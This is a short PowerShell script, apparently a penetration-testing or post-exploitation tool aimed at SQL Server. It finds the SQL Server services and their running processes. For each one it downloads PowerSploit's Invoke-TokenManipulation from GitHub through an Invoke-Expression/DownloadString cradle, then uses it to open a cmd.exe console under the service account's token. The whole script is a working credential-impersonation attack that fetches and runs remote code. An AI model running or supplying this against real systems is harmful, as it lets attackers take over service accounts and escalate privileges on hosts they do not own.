Write-Host "Getting list of SQL Server services..."
$SqlServices = Get-WmiObject -Class win32_service | where {$_.pathname -like "*Microsoft SQL Server*"} | select displayname,pathname,StartName 
$RunningProc = Get-WmiObject -Class win32_process | select processid,ExecutablePath

Write-Host "Getting list of SQL Server processes..."
$RunningProc | 
ForEach-Object {
  
    $p_ExecutablePath = $_.ExecutablePath
    $p_processid = $_.processid
    $SqlServices | 
    ForEach-Object {
        $s_pathname = $_.pathname.Split("`"")[1]
        $s_displayname = $_.displayname
        $s_serviceaccount = $_.StartName        
        if($s_pathname -like "$p_ExecutablePath"){
            Write-Host "Creating console for service: $s_displayname - Account: $s_serviceaccount"
            Invoke-Expression (new-object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-TokenManipulation.ps1');
            Invoke-TokenManipulation -CreateProcess 'cmd.exe' -ProcessId $p_processid -ErrorAction SilentlyContinue
        }
    }    
}

Write-Host "Done."